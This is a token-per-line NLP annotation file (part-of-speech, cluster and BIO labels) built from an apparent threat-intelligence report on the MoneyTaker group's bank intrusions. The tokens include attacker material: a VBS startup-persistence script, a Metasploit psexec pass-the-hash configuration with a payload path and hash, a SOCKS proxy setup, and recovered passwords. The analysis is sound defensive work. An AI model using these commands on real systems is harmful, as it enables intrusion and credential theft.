second	JJ	1100001	O
check	NN	10010101	O
.	.	0110	O

2	CD	00111110010	O
.	.	0110	O

Checks	NNS	X	O
if	IN	001110111100	O
the	DT	111110	O
IP	NNP	110100110	O
address	NN	10110010	O
from	IN	00011110110	O
which	WDT	00101011	O
the	DT	111110	O
request	NN	10110110011	O
is	VBZ	00100011	O
made	VBN	0011011101010	O
is	VBZ	00100011	O
on	IN	0001111110	O
the	DT	111110	O
white	JJ	X	O
list	NN	1000100	O
.	.	0110	O

If	IN	01011111	O
yes	NNS	X	O
,	,	00000	O
then	RB	001011111011	O
the	DT	111110	O
malicious	JJ	110010010	O
file	NN	10110111110	O
mencstager.exe	NN	X	O
is	VBZ	00100011	O
delivered	VBN	001101110110	O
.	.	0110	O

If	IN	01011111	O
not	RB	00101110	O
,	,	00000	O
rundll32.exe	NN	1011010011	O
is	VBZ	00100011	O
transferred	VBN	001101110110	O
.	.	0110	O

51138beea3e2c21e	CD	X	O
c44d0932c71762a8	NN	X	O
–	VBZ	0111101111111	O
a	DT	11110	O
legitimate	JJ	110010011	O
Windows	NNP	110101110	O
file	NN	10110111110	O
.	.	0110	O

This	DT	0100110	O
verification	NN	1010011110	O
complicates	VBZ	X	O
investigative	JJ	110010100	O
activity	NN	101110111111	O
of	IN	00010	O
researchers	NNS	10111001111	O
who	WP	0010100111	O
can	MD	001001011	O
not	RB	00101110	O
get	VB	0011100110	O
the	DT	111110	O
malicious	JJ	110010010	O
file	NN	10110111110	O
because	IN	0011101111101	O
they	PRP	0010100100	O
try	VBP	00110001	O
to	TO	000110	O
download	VB	00111001111	O
it	PRP	00101010	O
from	IN	00011110110	O
an	DT	11111110	O
IP	NNP	110100110	O
address	NN	10110010	O
that	WDT	00001111	O
is	VBZ	00100011	O
not	RB	00101110	O
on	IN	0001111110	O
the	DT	111110	O
white	JJ	X	O
list	NN	1000100	O
.	.	0110	O

11	CD	001111100110	O
PROVISION	NN	X	O
OF	IN	X	O
THE	NNP	X	O
MALWARE	NNP	X	O
SURVIVABILITY	NN	X	O
03	CD	X	O
Unlike	IN	01011111	O
other	JJ	1110111110	O
groups	NNS	1011101011	O
conducting	VBG	00011111111110	O
targeted	JJ	110011100	O
attacks	NNS	101110000	O
,	,	00000	O
MoneyTaker	NNP	X	O
uses	NNS	0011101001	O
standard	VBP	11001000	O
techniques	NNS	10111110100	O
to	TO	000110	O
provide	VB	0011100101	B-Verb
malware	NN	10100010	B-Entity
survivability	NN	X	I-Entity
in	IN	0001110	I-Entity
the	DT	111110	I-Entity
system	NN	101010001	I-Entity
.	.	0110	O

Researchers	NNS	010100	O
have	VBP	00100110	O
not	RB	00101110	O
managed	VBN	001100101	O
to	TO	000110	O
recover	VB	0011100110	O
the	DT	111110	O
full	JJ	110011000	O
picture	NN	1000100	O
of	IN	00010	O
the	DT	111110	O
incidents	NNS	10111001111	O
that	WDT	00001111	O
occurred	VBD	00110110110	O
in	IN	0001110	O
the	DT	111110	O
autumn	NN	X	O
of	IN	00010	O
2016	CD	X	O
in	IN	0001110	O
Russia	NNP	0011111011	O
,	,	00000	O
because	IN	0011101111101	O
tracks	NNS	1100101110	O
of	IN	00010	O
successful	JJ	1100111010	O
attacks	NNS	101110000	O
were	VBD	00100000	O
carefully	RB	001011111111	O
removed	VBN	00110111100	O
.	.	0110	O

However	RB	010110	O
,	,	00000	O
Group-IB	NNP	X	O
has	VBZ	001001110	O
discovered	VBN	00110110010	O
that	IN	00001111	O
hackers	NNS	10111001111	O
infiltrated	VBD	101010101	O
the	DT	111110	O
network	NN	101010010	O
of	IN	00010	O
a	DT	11110	O
Russian	JJ	110111010	O
bank	NN	101010110	O
by	IN	000111110	O
gaining	VBG	11010101111	O
access	NN	10011011	O
to	TO	000110	O
the	DT	111110	O
home	NN	1100101111	O
computer	NN	101010000	O
of	IN	00010	O
the	DT	111110	O
bank	NN	101010110	O
’	NNP	X	O
s	NN	011101011	O
system	NN	101010001	O
administrator	NN	1011101101	O
.	.	0110	O

One	CD	010000	O
of	IN	00010	O
the	DT	111110	O
methods	NNS	10111110100	O
to	TO	000110	O
ensure	VB	001110000	B-Verb
malware	NN	10100010	B-Entity
survivability	NN	X	I-Entity
in	IN	0001110	I-Entity
the	DT	111110	I-Entity
system	NN	101010001	I-Entity
was	VBD	00100010	B-Verb
the	DT	111110	B-Entity
creation	NN	1011010001	I-Entity
of	IN	00010	I-Entity
services	NNS	10111110110	I-Entity
using	VBG	0001111111000	I-Entity
.bat	NN	X	I-Entity
scripts	NNS	10111111011	I-Entity
that	WDT	00001111	I-Entity
launched	VBD	00110111100	I-Entity
the	DT	111110	I-Entity
VNC	NNP	X	I-Entity
server	NN	10110001	I-Entity
.	.	0110	O

The	DT	010010	B-Entity
contents	NNS	1000111	I-Entity
of	IN	00010	I-Entity
the	DT	111110	I-Entity
at1.bat	NN	X	I-Entity
file	NN	10110111110	I-Entity
:	:	O	O
«	JJ	X	O
c	NN	0111111110	O
:	:	O	O
\Program	JJ	X	O
Files\Cisco	NNP	X	O
Systems\VPN	NNP	X	O
Client\hostsec32.exe	NNP	X	O
»	NN	X	O
-install	DT	X	O
«	VBZ	X	O
Host	NNP	0111111110	O
Security	NNP	0111000	O
Server	NNP	1011011000	O
»	NN	X	O
The	DT	010010	O
contents	NNS	1000111	O
of	IN	00010	O
the	DT	111110	O
at2.bat	NN	X	O
file	NN	10110111110	O
:	:	O	O
«	JJ	X	O
c	NN	0111111110	O
:	:	O	O
\Program	JJ	X	O
Files\Cisco	NNP	X	O
Systems\VPN	NNP	X	O
Client\hostsec32.exe	NNP	X	O
»	NN	X	O
-uninstall	DT	X	O
«	VBZ	X	O
host	NN	101101111010	O
security	NN	11011000	O
server	NN	10110001	O
»	NN	X	O
These	DT	0100010	O
batch	NN	11001000	O
files	NNS	10111111000	O
were	VBD	00100000	O
called	VBN	0011010110	O
from	IN	00011110110	O
Windows	NNP	110101110	O
Task	NNP	X	O
Scheduler	NNP	X	O
.	.	0110	O

In	IN	01011100	O
US	NNP	110111110	O
incidents	NNS	10111001111	O
,	,	00000	O
the	DT	111110	B-Entity
attacker	NN	101000010	I-Entity
used	VBN	0011011100	I-Entity
VBS	NNP	X	I-Entity
scripts	NNS	10111111011	I-Entity
that	WDT	00001111	I-Entity
created	VBD	0011011101011	I-Entity
a	DT	11110	I-Entity
link	NN	10010000	I-Entity
named	VBN	0011010110	I-Entity
«	JJ	X	I-Entity
Task	NNP	X	I-Entity
Scheduler	NNP	X	I-Entity
»	NNP	X	I-Entity
for	IN	0001111010	B-Preposition
a	DT	11110	B-Entity
specific	JJ	11001101110	I-Entity
user	NN	101010011	I-Entity
in	IN	0001110	I-Entity
the	DT	111110	I-Entity
startup	NN	1101010000	I-Entity
to	TO	000110	I-Entity
launch	VB	00111001110	I-Entity
the	DT	111110	I-Entity
malicious	JJ	110010010	I-Entity
file	NN	10110111110	I-Entity
.	.	0110	O

Set	NNP	X	B-Entity
oWS	MD	X	I-Entity
=	VB	011101100	I-Entity
WScript.CreateObject	NNP	X	I-Entity
(	(	0111101110	I-Entity
«	NNP	X	I-Entity
WScript.Shell	NNP	X	I-Entity
»	NNP	X	I-Entity
)	)	01111000	I-Entity
sLinkFile	JJ	X	I-Entity
=	NNP	011101100	I-Entity
«	NNP	X	I-Entity
C	NNP	01110011	I-Entity
:	:	O	I-Entity
\Users\	JJ	X	I-Entity
<	CD	0111011110	I-Entity
%	NN	011101010	I-Entity
username	JJ	10110111011	I-Entity
%	NN	011101010	I-Entity
>	NNP	0111011111	I-Entity
\AppData\Roaming\Microsoft\	NN	X	I-Entity
Windows\Start	NNP	X	I-Entity
Menu\Programs\Startup\taskhost.lnk	NNP	X	I-Entity
»	NN	X	I-Entity
Set	NNP	X	I-Entity
oLink	VBP	X	I-Entity
=	JJ	011101100	I-Entity
oWS.CreateShortcut	NN	X	I-Entity
(	(	0111101110	I-Entity
sLinkFile	NN	X	I-Entity
)	)	01111000	I-Entity
oLink.TargetPath	NN	X	I-Entity
=	NN	011101100	I-Entity
«	NNP	X	I-Entity
C	NNP	01110011	I-Entity
:	:	O	I-Entity
\Users\	JJ	X	I-Entity
<	CD	0111011110	I-Entity
%	NN	011101010	I-Entity
username	JJ	10110111011	I-Entity
%	NN	011101010	I-Entity
>	NNP	0111011111	I-Entity
\AppData\Local\	NN	X	I-Entity
Temp\taskhost.exe	NNP	X	I-Entity
»	NN	X	I-Entity
‘	JJ	X	I-Entity
oLink.Arguments	NNS	X	I-Entity
=	VBP	011101100	I-Entity
«	CD	X	I-Entity
»	NN	X	I-Entity
‘	JJ	X	I-Entity
oLink.Description	NN	X	I-Entity
=	NNP	011101100	I-Entity
«	NNP	X	I-Entity
Task	NNP	X	I-Entity
Scheduler	NNP	X	I-Entity
»	NN	X	I-Entity
‘	NN	X	I-Entity
oLink.HotKey	MD	X	I-Entity
=	VB	011101100	I-Entity
«	NNP	X	I-Entity
ALT+CTRL+F	NNP	X	I-Entity
»	NN	X	I-Entity
‘	JJ	X	I-Entity
oLink.IconLocation	NN	X	I-Entity
=	NNP	011101100	I-Entity
«	NNP	X	I-Entity
C	NNP	01110011	I-Entity
:	:	O	I-Entity
\Users\	JJ	X	I-Entity
<	CD	0111011110	I-Entity
%	NN	011101010	I-Entity
username	JJ	10110111011	I-Entity
%	NN	011101010	I-Entity
>	NNP	0111011111	I-Entity
\AppData\Local\	NN	X	I-Entity
Temp\taskhost.exe	NNP	X	I-Entity
,	,	00000	I-Entity
2	CD	00111110010	I-Entity
»	NN	X	I-Entity
‘	JJ	X	I-Entity
oLink.WindowStyle	JJ	X	I-Entity
=	NNP	011101100	I-Entity
«	NNP	X	I-Entity
1	CD	00111110010	I-Entity
»	NN	X	I-Entity
‘	JJ	X	I-Entity
oLink.WorkingDirectory	NN	X	I-Entity
=	NNP	011101100	I-Entity
«	NNP	X	I-Entity
C	NNP	01110011	I-Entity
:	:	O	I-Entity
\Users\	JJ	X	I-Entity
<	CD	0111011110	I-Entity
%	NN	011101010	I-Entity
username	JJ	10110111011	I-Entity
%	NN	011101010	I-Entity
>	NNP	0111011111	I-Entity
\AppData\	NN	X	I-Entity
Local\Temp	NNP	X	I-Entity
»	NN	X	I-Entity
oLink.Save	NN	X	I-Entity
12	CD	001111100110	I-Entity
04	CD	X	I-Entity
PROPAGATION	NNP	X	I-Entity
ACROSS	NNP	X	I-Entity
THE	DT	X	I-Entity
NETWORK	NNP	X	I-Entity
After	IN	01011101	O
successfully	RB	001011111101	O
infecting	VBG	00111011100	O
one	CD	11101000	O
of	IN	00010	O
the	DT	111110	O
computers	NNS	1011111000	O
and	CC	00001101	O
gaining	VBG	11010101111	O
initial	JJ	1100101101	O
access	NN	10011011	O
to	TO	000110	O
the	DT	111110	O
system	NN	101010001	O
,	,	00000	O
the	DT	111110	O
attacker	NN	101000010	O
performs	VBZ	0011101001	O
reconnaissance	NN	10111111110	O
of	IN	00010	O
the	DT	111110	O
local	JJ	1101110111	O
network	NN	101010010	O
in	IN	0001110	O
order	NN	001111011	O
to	TO	000110	O
gain	VB	0011100101	B-Verb
domain	NN	10110111100	B-Entity
administrator	NN	1011101101	I-Entity
privileges	NNS	10111110110	I-Entity
and	CC	00001101	O
eventually	RB	00101111010	O
consolidate	VB	X	B-Verb
control	NN	1101000	B-Entity
over	IN	00011111110010	I-Entity
the	DT	111110	I-Entity
network	NN	101010010	I-Entity
.	.	0110	O

Hackers	NNS	X	O
use	VBP	10010110	O
the	DT	111110	O
Metasploit	NNP	101010111	O
tool	NN	101001001	O
to	TO	000110	O
conduct	VB	00111001110	B-Verb
network	NN	101010010	B-Entity
reconnaissance	NN	10111111110	I-Entity
,	,	00000	I-Entity
search	NN	10010101	I-Entity
for	IN	0001111010	I-Entity
vulnerable	JJ	1100110100	I-Entity
applications	NNS	10111111011	I-Entity
,	,	00000	O
exploit	VB	1010011100	O
vulnerabilities	NNS	10111110101	O
,	,	00000	O
escalate	VBP	00111001110	O
systems	NNS	1011111000	O
privileges	NNS	10111110110	O
,	,	00000	O
and	CC	00001101	O
collect	VB	0011100110	O
information	NN	10011101	O
.	.	0110	O

Gaining	VBG	X	O
admin	NN	01111110	O
privileges	NNS	10111110110	O
To	TO	01011101	O
escalate	VB	00111001110	O
privileges	NNS	10111110110	O
up	RB	10011001	O
to	TO	000110	O
the	DT	111110	O
local	JJ	1101110111	O
administrator	NN	1011101101	O
(	(	0111101110	O
or	CC	00001100	O
“	VB	X	O
SYSTEM	NNP	011101011	O
”	VB	X	O
local	JJ	1101110111	O
user	NN	101010011	O
)	)	01111000	O
,	,	00000	O
attackers	NNS	10100000	O
use	VBP	10010110	O
exploit	JJ	1010011100	O
modules	NNS	10111111001	O
from	IN	00011110110	O
the	DT	111110	O
standard	NN	11001000	O
Metasploit	NNP	101010111	O
pack	NN	00111001111	O
,	,	00000	O
or	CC	00001100	O
exploits	NNS	10111110101	O
designed	VBN	001100100	O
to	TO	000110	O
bypass	VB	0011100110	B-Verb
the	DT	111110	B-Entity
UAC	NNP	011111110	I-Entity
technology	NN	110110011	I-Entity
.	.	0110	O

With	IN	01011101	O
local	JJ	1101110111	O
administrator	NN	1011101101	O
privileges	NNS	10111110110	O
they	PRP	0010100100	O
can	MD	001001011	O
use	VB	10010110	O
the	DT	111110	O
Mimikatz	NNP	10111001111	O
program	NN	1010011010	O
,	,	00000	O
which	WDT	00101011	O
is	VBZ	00100011	O
loaded	VBN	00110111100	O
into	IN	0001111111010	O
the	DT	111110	O
memory	NN	1011011010	O
using	VBG	0001111111000	O
Meterpreter	NNP	X	O
,	,	00000	O
to	TO	000110	O
extract	VB	00111001111	B-Verb
unencrypted	JJ	1100111110	B-Entity
Windows	NNP	110101110	I-Entity
credentials	NNS	101111101110	I-Entity
.	.	0110	O

In	IN	01011100	O
addition	NN	001111011	O
to	TO	000110	O
the	DT	111110	O
standard	JJ	11001000	O
modules	NNS	10111111001	O
from	IN	00011110110	O
the	DT	111110	O
Metasploit	NNP	101010111	O
pack	NN	00111001111	O
,	,	00000	O
the	DT	111110	O
following	VBG	11000111	O
tools	NNS	10111111011	O
are	VBP	00100001	O
used	VBN	0011011100	O
to	TO	000110	O
escalate	VB	00111001110	O
privileges	NNS	10111110110	O
:	:	O	O
Name	NN	0111111110	O
MD5	NN	011111111111	O
Type	NN	011101100	O
ASLRSideChannelAttack.exe	$	X	O
9a82aa5af19fa0a6167f87ee500856d53690c92c8c6449af54d8e5d33cf8bff4	CD	X	O
LPE	NNP	X	O
Win10x64	NNP	X	O
cve.bat	NN	X	O
cve.exe	NN	X	O
7ff092853c15b51315414939c165ea9bce1f920d2d99e570d747ee7fc9fa734a	CD	X	O
BAT	NNP	X	O
LPE	NNP	X	O
executor	NN	X	O
98b6f9172ca273deef324f032a8e992b6e6ca3c6542449a48246b3646b6c8cb6	CD	X	O
cve-2016-7255	NN	X	O
cve-2016-7255.exe	NN	X	O
5ec6a6c9a7233a7ff68d989d830a2249e94a2784e69d5c8a593d3345da14a6b5	CD	X	O
cve-2016-7255	NN	X	O
cve-2016-7255test.exe	NN	X	O
df69966d721193e2315723dd71636b93cc76b38cfa046dce45d7aec4856f4bee	NN	X	O
cve-2016-7255	NN	X	O
It	PRP	0101010	O
is	VBZ	00100011	O
interesting	VBG	1100111111	O
to	TO	000110	O
analyze	VB	0011100110	O
the	DT	111110	O
ASLRSideChannelAttack.exe	NNP	X	O
file	NN	10110111110	O
.	.	0110	O

It	PRP	0101010	O
was	VBD	00100010	O
compiled	VBN	0011011101111	O
on	IN	0001111110	O
October	NNP	001111010	O
23	CD	001111100110	O
,	,	00000	O
2016	CD	X	O
based	VBN	001101000	O
on	IN	0001111110	O
codes	NNS	10111111000	O
presented	VBN	00110110111	O
at	IN	000111111110	O
the	DT	111110	O
Russian	JJ	110111010	O
conference	NN	1011101100	O
ZeroNights	NNS	X	O
2016	CD	X	O
.	.	0110	O

The	DT	010010	O
codes	NNS	10111111000	O
are	VBP	00100001	O
available	JJ	00110111101	O
online	NN	1100101011	O
at	IN	000111111110	O
https	NN	X	O
:	:	O	O
//github.com/IOActive/I-know-where-your-page-	JJ	X	O
lives	NNS	1011100110	O
.	.	0110	O

13	CD	001111100111	O
In	IN	01011100	O
addition	NN	001111011	O
,	,	00000	O
they	PRP	0010100100	O
actively	RB	001011111110	O
searched	VBD	0011010101	O
for	IN	0001111010	O
passwords	NNS	101111101110	O
stored	VBN	00110110111	O
in	IN	0001110	O
Active	NNP	1101011110	O
Directory	NNP	10110111100	O
group	NN	1011101001	O
policies	NNS	10111110110	O
by	IN	000111110	O
exploiting	VBG	00111011100	O
the	DT	111110	O
MS14-025	NNP	X	O
vulnerability	NN	101001000	O
and	CC	00001101	O
the	DT	111110	O
corresponding	JJ	1101010000	O
Metasploit	NNP	101010111	O
module	NN	1010001111	O
(	(	0111101110	O
post/windows/gather/	NN	X	O
credentials/gpp	NN	X	O
)	)	01111000	O
.	.	0110	O

After	IN	01011101	O
receiving	VBG	00111011100	O
group	NN	1011101001	O
policy	NN	1011101110	O
files	NNS	10111111000	O
,	,	00000	O
the	DT	111110	B-Entity
attacker	NN	101000010	I-Entity
decrypted	VBD	00110111100	O
the	DT	111110	O
passwords	NNS	101111101110	O
that	WDT	00001111	O
were	VBD	00100000	O
stored	VBN	00110110111	O
there	RB	0010100110	O
and	CC	00001101	O
used	VBD	0011011100	O
them	PRP	10011110	O
on	IN	0001111110	O
other	JJ	1110111110	O
workstations	NNS	10111111011	O
.	.	0110	O

In	IN	01011100	O
some	DT	1110101110	O
cases	NNS	10111111110	O
,	,	00000	O
passwords	NNS	101111101110	O
of	IN	00010	O
bank	NN	101010110	O
systems	NNS	1011111000	O
’	VBP	X	O
accounts	NNS	101100110	O
granting	VBG	X	O
local	JJ	1101110111	O
administrator	NN	1011101101	O
privileges	NNS	10111110110	O
were	VBD	00100000	O
very	RB	111000	O
weak	JJ	1100110100	O
.	.	0110	O

Here	RB	0101011	O
is	VBZ	00100011	O
an	DT	11111110	O
example	NN	101011100	O
of	IN	00010	O
domain	NN	10110111100	O
administrator	NN	1011101101	O
passwords	NNS	101111101110	O
that	WDT	00001111	O
attackers	NNS	10100000	O
recovered	VBD	00110110011	O
:	:	O	O
User	NNP	011111110	O
name	NN	1011010000	O
Encrypted	VBN	X	O
value	NN	10110111000	O
of	IN	00010	O
the	DT	111110	O
password	NN	101101111110	O
field	NN	10110111000	O
Decrypted	VBN	X	O
password	NN	101101111110	O
Administrator	NN	X	O
Uj80N3lMoEtnIXIP+dTzzBK/2/mALyumPkQaj9249KY	NN	X	O
Wrongpassword1	NN	X	O
Administrator	NN	X	O
n8rOHPvtmB1j24AV7EYclWS6DgQWaoQkfqzOZVlBLzI	NN	X	O
System321	NN	X	O
Using	VBG	01011111	O
the	DT	111110	O
Metasploit	NNP	101010111	O
modules	NNS	10111111001	O
with	IN	000111100	O
the	DT	111110	O
functionality	NN	10111111101	O
of	IN	00010	O
dumping	VBG	1101010100	O
Windows	NNP	110101110	O
local	JJ	1101110111	O
users	NNS	10111001110	O
’	VBP	X	O
password	JJ	101101111110	O
hashes	NNS	1011010011	O
stored	VBN	00110110111	O
in	IN	0001110	O
the	DT	111110	O
Security	NNP	0111000	O
Accounts	NNS	X	O
Manager	NNP	1011010011	O
(	(	0111101110	O
hashdump	NN	X	O
or	CC	00001100	O
smart_hashdump	NN	X	O
modules	NNS	10111111001	O
)	)	01111000	O
,	,	00000	O
hackers	NNS	10111001111	O
received	VBD	001101110100	O
the	DT	111110	O
local	JJ	1101110111	O
administrator	NN	1011101101	O
’	NNP	X	O
s	NN	011101011	O
NTLM	NNP	X	O
hash	NN	1011010011	O
,	,	00000	O
as	RB	00001110	O
well	RB	001111111111	O
as	IN	00001110	O
the	DT	111110	O
NTLM	NNP	X	O
hash	NN	1011010011	O
and	CC	00001101	O
unencrypted	JJ	1100111110	O
password	NN	101101111110	O
for	IN	0001111010	O
domain	NN	10110111100	O
users	NNS	10111001110	O
.	.	0110	O

Propagation	NN	X	O
across	IN	00011111111110	O
the	DT	111110	O
network	NN	101010010	O
To	TO	01011101	O
get	VB	0011100110	O
the	DT	111110	O
list	NN	1000100	O
of	IN	00010	O
computers	NNS	1011111000	O
in	IN	0001110	O
Active	NNP	1101011110	O
Directory	NNP	10110111100	O
,	,	00000	O
hackers	NNS	10111001111	O
often	RB	00101111010	O
use	VBP	10010110	O
a	DT	11110	O
PowerShell	NNP	X	O
script	NN	101101111011	O
named	VBN	0011010110	O
allpc.ps1	NN	X	O
,	,	00000	O
which	WDT	00101011	O
was	VBD	00100010	O
copied	VBN	001101110110	O
from	IN	00011110110	O
this	DT	1111110	O
discussion	NN	10111111111	O
in	IN	0001110	O
October	NNP	001111010	O
2015	CD	X	O
:	:	O	O
https	NN	X	O
:	:	O	O
//serverfault.com/questions/732681/export-simple-list-of-all-	JJ	X	O
computers-in-multiple-ous-in-ad	NN	X	O
To	TO	01011101	O
propagate	VB	X	O
across	IN	00011111111110	O
the	DT	111110	O
network	NN	101010010	O
,	,	00000	O
hackers	NNS	10111001111	O
used	VBD	0011011100	O
a	DT	11110	O
legitimate	JJ	110010011	O
tool	NN	101001001	O
psexec	NN	X	O
,	,	00000	O
which	WDT	00101011	O
is	VBZ	00100011	O
typical	JJ	1100110100	O
for	IN	0001111010	O
network	NN	101010010	O
administrators	NNS	10111110110	O
.	.	0110	O

This	DT	0100110	O
tool	NN	101001001	O
creates	VBZ	0011101001	O
a	DT	11110	O
local	JJ	1101110111	O
service	NN	101101111011	O
via	IN	00011111110011	O
SMB/RPC	NNP	X	O
protocol	NN	1011111001	O
,	,	00000	O
then	RB	001011111011	O
executes	VBZ	0011101000	O
and	CC	00001101	O
deletes	NNS	0011101001	O
it	PRP	00101010	O
.	.	0110	O

In	IN	01011100	O
the	DT	111110	O
service	NN	101101111011	O
properties	NNS	011111111111	O
,	,	00000	O
the	DT	111110	B-Entity
required	JJ	001100110	I-Entity
command	NN	11010110	I-Entity
is	VBZ	00100011	I-Entity
set	VBN	100000	I-Entity
to	TO	000110	I-Entity
start	VB	00111001111	I-Entity
.	.	0110	O

The	DT	010010	O
attacker	NN	101000010	O
used	VBD	0011011100	O
two	CD	11101101	O
methods	NNS	10111110100	O
to	TO	000110	O
distribute	VB	0011100110	O
the	DT	111110	O
payload	NN	1010011011	O
:	:	O	O
they	PRP	0010100100	O
placed	VBD	0011011101111	O
executable	JJ	1010011111	O
files	NNS	10111111000	O
in	IN	0001110	O
the	DT	111110	O
network	NN	101010010	O
folder	NN	10110111011	O
,	,	00000	O
and	CC	00001101	O
forced	VBD	001100101	O
the	DT	111110	O
attacked	JJ	101010101	O
computers	NNS	1011111000	O
to	TO	000110	O
start	VB	00111001111	O
them	PRP	10011110	O
,	,	00000	O
or	CC	00001100	O
indicated	VBD	0011011101110	O
the	DT	111110	O
shell	NN	10110111010	O
code	NN	101001100	O
directly	RB	10010010	O
in	IN	0001110	O
the	DT	111110	O
service	NN	101101111011	O
start	NN	00111001111	O
line	NN	011101101	O
.	.	0110	O

For	IN	0100011	O
passwords	NNS	101111101110	O
that	WDT	00001111	O
were	VBD	00100000	O
received	VBN	001101110100	O
as	IN	00001110	O
an	DT	11111110	O
NTLM	NNP	X	O
hash	NN	1011010011	O
and	CC	00001101	O
were	VBD	00100000	O
not	RB	00101110	O
decrypted	VBN	00110111100	O
,	,	00000	O
the	DT	111110	O
Pass-the-hash	NNP	X	O
technique	NN	101001000	O
was	VBD	00100010	O
used	VBN	0011011100	O
,	,	00000	O
which	WDT	00101011	O
allows	VBZ	00111010110	O
using	VBG	0001111111000	O
an	DT	11111110	O
NTLM	NNP	X	O
hash	NN	1011010011	O
for	IN	0001111010	O
authentication	NN	1010011100	O
without	IN	0011101111110	O
password	NN	101101111110	O
.	.	0110	O

To	TO	01011101	O
do	VB	0011010010	O
this	DT	1111110	O
,	,	00000	O
the	DT	111110	O
same	JJ	11000101	O
legitimate	JJ	110010011	O
Metasploit	NNP	101010111	O
’	NNP	X	O
s	VBD	011101011	O
psexec	JJ	X	O
modules	NNS	10111111001	O
were	VBD	00100000	O
used	VBN	0011011100	O
without	IN	0011101111110	O
any	DT	111010100	O
modification	NN	10110111000	O
.	.	0110	O

14	CD	001111100111	O

use	NN	10010110	B-Entity
auxiliary/admin/smb/psexec	JJ	X	I-Entity
_	NN	X	I-Entity
command	NN	11010110	I-Entity
set	VBN	100000	I-Entity
COMMAND	NNP	X	I-Entity
start	NN	00111001111	I-Entity
\\\\10.1.5.35\\tmp\\msc7.exe	NN	X	I-Entity
set	NN	100000	I-Entity
RHOSTS	NNP	X	I-Entity
10.1.5.35	CD	X	I-Entity
set	VBN	100000	I-Entity
SMBUser	NNP	X	I-Entity
Administrator	NNP	X	I-Entity
set	VBN	100000	I-Entity
SMBPass	NNP	X	I-Entity
aad3b435b51404eeaad3b435b51404ee:23cec95759ea5880	NN	X	I-Entity
adf1794f475c23cd	NN	X	I-Entity
set	VBN	100000	I-Entity
SMBDomain	NNP	X	I-Entity
WORKGROUP	NNP	X	I-Entity
After	IN	01011101	O
gaining	VBG	11010101111	O
access	NN	10011011	O
to	TO	000110	O
new	JJ	11001101111	O
systems	NNS	1011111000	O
,	,	00000	O
attackers	NNS	10100000	B-Entity
repeated	VBD	1100111010	B-Verb
the	DT	111110	B-Entity
above-mentioned	JJ	X	I-Entity
procedure	NN	1010010111	I-Entity
to	TO	000110	I-Entity
collect	VB	0011100110	I-Entity
passwords	NNS	101111101110	I-Entity
.	.	0110	O

Remote	NNP	11010101111	O
access	NN	10011011	O
Until	IN	X	O
October	NNP	001111010	O
2017	CD	X	O
,	,	00000	O
hackers	NNS	10111001111	O
remotely	RB	10010010	O
accessed	VBD	0011011101010	O
systems	NNS	1011111000	O
of	IN	00010	O
interest	NN	10011110	O
using	VBG	0001111111000	O
standard	JJ	11001000	O
Metasploit	NNP	101010111	O
tools	NNS	10111111011	O
,	,	00000	O
as	RB	00001110	O
well	RB	001111111111	O
as	IN	00001110	O
legitimate	JJ	110010011	O
remote	NN	11010101111	O
access	NN	10011011	O
programs	NNS	10111111001	O
.	.	0110	O

On	IN	01011101	O
hosts	NNS	1011111000	O
where	WRB	001110110111	O
Meterpreter	NNP	X	O
was	VBD	00100010	O
launched	VBN	00110111100	O
,	,	00000	O
hackers	NNS	10111001111	O
set	VBD	100000	O
up	RP	10011001	O
a	DT	11110	O
SOCKS	NNP	X	O
proxy	NN	1101010100	O
server	NN	10110001	O
,	,	00000	O
which	WDT	00101011	O
allowed	VBD	00111010110	O
them	PRP	10011110	O
to	TO	000110	O
remotely	RB	10010010	O
send	VB	00111001111	O
commands	NNS	101111101111	O
within	IN	00011111111111	O
the	DT	111110	O
local	JJ	1101110111	O
network	NN	101010010	O
.	.	0110	O

To	TO	01011101	O
create	VB	00111001111	O
a	DT	11110	O
connection	NN	10010000	O
via	IN	00011111110011	O
SOCKS	NNP	X	O
proxy	NN	1101010100	O
,	,	00000	O
they	PRP	0010100100	O
primarily	RB	001011111010	O
used	VBD	0011011100	O
ports	NNS	11011010	O
7080	CD	X	O
and	CC	00001101	O
1808	CD	X	O
:	:	O	O
use	NN	10010110	O
auxiliary/server/socks4a	NN	X	O
show	NN	001110000	O
options	NNS	10111111100	O
set	VBN	100000	O
SRVHOST	NNP	X	O
_	NNP	X	O
c2serverIP	NN	X	O
_	NN	X	O
set	VBN	100000	O
SRVPORT	NNP	X	O
7080	CD	X	O
In	IN	01011100	O
addition	NN	001111011	O
,	,	00000	O
they	PRP	0010100100	O
actively	RB	001011111110	O
used	VBD	0011011100	O
various	JJ	1110111111	O
VNC	NNP	X	O
clients	NNS	10111001110	O
